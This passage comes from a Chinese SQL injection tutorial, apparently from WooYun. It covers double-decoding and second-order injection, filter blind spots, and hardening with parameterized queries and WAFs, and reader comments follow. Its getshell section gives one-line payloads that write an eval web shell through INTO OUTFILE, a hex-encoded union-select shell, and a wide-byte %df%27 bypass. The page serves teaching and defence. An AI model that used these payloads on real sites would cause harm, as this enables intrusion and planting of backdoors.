+<p><strong>17.</strong>使用了urldecode 或者rawurldecode函数，则会导致二次解码声场单引号而发生注入。</p>
+
+<pre><code>#!php
+&lt;?php
+$a=addslashes($_GET['p']);
+$b=urldecode($a);
+echo '$a=' .$a;
+echo '&lt;br /&gt;';
+echo '$b=' .$b;
+?&gt;
+</code></pre>
+
+<p><img alt="p14" img-src="d52e0a44e0b1e62f3c82672079596b200a022f91.jpg"></p>
+
+<p><strong>18.</strong>逻辑引用，导致二次注入</p>
+
+<p>部分盲点</p>
+
+<p>盲点如下：</p>
+
+<ol>
+<li>注入点类似id=1这种整型的参数就会完全无视GPC的过滤；</li>
+<li>注入点包含键值对的，那么这里只检测了value，对key的过滤就没有防护；</li>
+<li>有时候全局的过滤只过滤掉GET、POST和COOKIE，但是没过滤SERVER。</li>
+</ol>
+
+<p>附常见的SERVER变量（具体含义自行百度）：</p>
+
+<pre><code>QUERY_STRING,X_FORWARDED_FOR,CLIENT_IP,HTTP_HOST,ACCEPT_LANGUAGE
+</code></pre>
+
+<p><em>PS：若对注入的代码审计有实际操类演练，参考<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d83f41653d60653d75483d505e3c62733c61533c637b3f78593d76793076793f425c3051623e44773f6b633d504f90b9bbb39aaab9b1bc98ebe8e93d4470306f773c">[email&#160;protected]</a></code></em></p>
+
+<h1>0x06 安全加固</h1>
+
+<hr>
+
+<h3>6.1 源码加固</h3>
+
+<p><strong>1.预编译处理</strong></p>
+
+<p>参数化查询是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数来给值。在SQL语句中，这些参数通常一占位符来表示。</p>
+
+<p>MSSQL（ASP.NET）</p>
+
+<p>为了提高sql执行速度，请为SqlParameter参数加上SqlDbType和size属性</p>
+
+<pre><code>#!php
+SqlConnection conn = new SqlConnection("server=(local)\\SQL2005;user id=sa;pwd=12345;initial catalog=TestDb");
+conn.Open();
+SqlCommand cmd = new SqlCommand("SELECT TOP 1 * FROM [User] WHERE UserName = @UserName AND Password = @Password");
+cmd.Connection = conn;
+cmd.Parameters.AddWithValue("UserName", "user01");
+cmd.Parameters.AddWithValue("Password", "123456");
+
+reader = cmd.ExecuteReader();
+reader.Read();
+int userId = reader.GetInt32(0);
+
+reader.Close();
+conn.Close();
+</code></pre>
+
+<p>PHP</p>
+
+<pre><code>#!php
+// 实例化数据抽象层对象
+$db = new PDO('pgsql:host=127.0.0.1;port=5432;dbname=testdb');
+// 对 SQL 语句执行 prepare，得到 PDOStatement 对象
+$stmt = $db-&gt;prepare('SELECT * FROM "myTable" WHERE "id" = :id AND "is_valid" = :is_valid');
+// 绑定参数
+$stmt-&gt;bindValue(':id', $id);
+$stmt-&gt;bindValue(':is_valid', true);
+// 查询
+$stmt-&gt;execute();
+// 获取数据
+foreach($stmt as $row) {
+var_dump($row);
+}
+</code></pre>
+
+<p>JAVA</p>
+
+<pre><code>#!java
+java.sql.PreparedStatement prep = connection.prepareStatement(
+"SELECT * FROM `users` WHERE USERNAME = ? AND PASSWORD = ?");
+prep.setString(1, username);
+prep.setString(2, password);
+prep.executeQuery();
+</code></pre>
+
+<p><em>PS：尽管SQL语句大体相似，但是在不同数据库的特点，可能参数化SQL语句不同，例如在Access中参数化SQL语句是在参数直接以“?”作为参数名，在SQL <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c596a0b7b3a0b7217d68235d6a204a4723507523594c27455985274558204c48227945">[email&#160;protected]</a>，在MySQL中是参数有“?”前缀，在Oracle中参数以“:”为前缀。</em></p>
+
+<p><strong>2.过滤函数的使用</strong></p>
+
+<ol>
+<li>addslashes()</li>
+<li>mysql&#95;escape&#95;string()</li>
+<li>mysql&#95;real&#95;escape_string()</li>
+<li>intval()</li>
+</ol>
+
+<p><strong>3.框架及第三方过滤函数与类</strong></p>
+
+<ol>
+<li>JAVA hibernate框架</li>
+<li>Others</li>
+</ol>
+
+<h3>6.2 产品加固</h3>
+
+<ul>
+<li>Web应用防火墙——WAF</li>
+<li>Key:云waf、安全狗、云锁、sqlchop</li>
+</ul>
+
+<h1>0x07 关联应用</h1>
+
+<hr>
+
+<h3>7.1 Getshell</h3>
+
+<ol>
+<li>注入，查数据，找管理员密码，进后台，找上传，看返回，getshell</li>
+<li>PHP MYSQL 类，大权限，知路径，传文件，回shell(上传&amp;命令执行)，OS-SHELL。</li>
+<li>MSSQL大权限，知路径，传文件，回shell。结合xp_cmdshell 执行系统命令。</li>
+<li>Phpmyadmin getshell （编码） 
+
+<ol>
+<li><code>select '&lt;?eval($_POST[cmd]);?&gt;' into outfile 'd:/wwwroot/1.php';</code></li>
+</ol></li>
+<li>Union select getshell 
+
+<ol>
+<li><code>and 1=2 union select 0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e into outfile '/alidata/www/cms/ttbdxt/conf.php'--</code></li>
+</ol></li>
+</ol>
+
+<h3>7.2 关联功能点</h3>
+
+<table>
+<thead>
+<tr>
+  <th>序号</th>
+  <th>功能点</th>
+  <th>参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>1</td>
+  <td>登录</td>
+  <td>Username password</td>
+</tr>
+<tr>
+  <td>2</td>
+  <td>Header</td>
+  <td>Cookie Referer x-forward remote-ip</td>
+</tr>
+<tr>
+  <td>3</td>
+  <td>查询展示 , 数据写入（表单） , 数据更新</td>
+  <td>id u category price str value</td>
+</tr>
+<tr>
+  <td>4</td>
+  <td>数据搜素</td>
+  <td>Key</td>
+</tr>
+<tr>
+  <td>5</td>
+  <td>伪静态</td>
+  <td>（同3），加*</td>
+</tr>
+<tr>
+  <td>6</td>
+  <td>Mysql不安全配置 , <code>Set character_set_client=gbk</code></td>
+  <td>%df%27</td>
+</tr>
+<tr>
+  <td>7</td>
+  <td>传参（横向数据流向、纵向入库流向）</td>
+  <td>Parameter （同3）</td>
+</tr>
+<tr>
+  <td>8</td>
+  <td>订单类多级交互、重新编辑 , 配送地址、资料编辑</td>
+  <td>二次注入</td>
+</tr>
+<tr>
+  <td>9</td>
+  <td>APP仍调用WEB API</td>
+  <td>同3</td>
+</tr>
+<tr>
+  <td>10</td>
+  <td>编码urldecode base64</td>
+  <td>Urldecode() rawurldecode()</td>
+</tr>
+</tbody>
+</table>
+
+<h1>0x08 参考资料</h1>
+
+<hr>
+
+<ul>
+<li><a href="http://blog.csdn.net/rongyongfeikai2/article/details/40457827">http://blog.csdn.net/rongyongfeikai2/article/details/40457827</a></li>
+<li><a href="http://drops.wooyun.org/tips/5254">http://drops.wooyun.org/tips/5254</a></li>
+<li><a href="https://www.91ri.org/7852.html">https://www.91ri.org/7852.html</a></li>
+<li><a href="https://www.91ri.org/7869.html">https://www.91ri.org/7869.html</a></li>
+<li><a href="https://www.91ri.org/7860.html">https://www.91ri.org/7860.html</a></li>
+<li><a href="http://www.cnblogs.com/hongfei/category/372087.html">http://www.cnblogs.com/hongfei/category/372087.html</a></li>
+<li><a href="http://www.cnblogs.com/shellr00t/p/5310187.html">http://www.cnblogs.com/shellr00t/p/5310187.html</a></li>
+<li><a href="https://www.91ri.org/15074.html">https://www.91ri.org/15074.html</a></li>
+<li><a href="http://blog.wils0n.cn/?post=11">http://blog.wils0n.cn/?post=11</a></li>
+</ul>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">乐清小俊杰</span>
+                 <span class="reply-time">2016-06-25 22:47:49</span>
+        </div>
+        <p></p><p>我还以为要讲关联分析...</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">程远</span>
+                 <span class="reply-time">2016-06-24 22:24:25</span>
+        </div>
+        <p></p><p>顶啊顶</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">火风暴</span>
+                 <span class="reply-time">2016-06-24 22:21:33</span>
+        </div>
+        <p></p><p>综合性强</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">万年死宅</span>
+                 <span class="reply-time">2016-06-24 22:09:48</span>
+        </div>
+        <p></p><p>看了不赞，王八蛋！！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">winsyk</span>
+                 <span class="reply-time">2016-06-24 16:49:58</span>
+        </div>
+        <p></p><p>这文章我还以为是讲SQL注入关联分析，读完发现是个科普文，不过写的还不错。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">YshBai</span>
+                 <span class="reply-time">2016-06-24 14:08:29</span>
+        </div>
+        <p></p><p>amazing</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">MrFk</span>
+                 <span class="reply-time">2016-06-24 13:45:23</span>
+        </div>
+        <p></p><p>收藏了。赞</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">袋鼠妈妈</span>
+                 <span class="reply-time">2016-06-24 13:29:16</span>
+        </div>
+        <p></p><p>nice！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Azui</span>
+                 <span class="reply-time">2016-06-24 12:39:53</span>
+        </div>
+        <p></p><p>good:)</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">hblf</span>
+                 <span class="reply-time">2016-06-24 12:27:04</span>
+        </div>
+        <p></p><p>写的很全面，赞！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">涛阁听海</span>
+                     <span class="weibo"></span>
+                    <span class="reply-time">2016-06-24 12:15:04</span>
+        </div>
+        <p></p><p>老大，微博手机客户端等级查看好像被劫持了唉，自动蹦到一个陌生的微博上=_=</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Gogoing</span>
+                 <span class="reply-time">2016-06-24 10:53:34</span>
+        </div>
+        <p></p><p>Nice</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
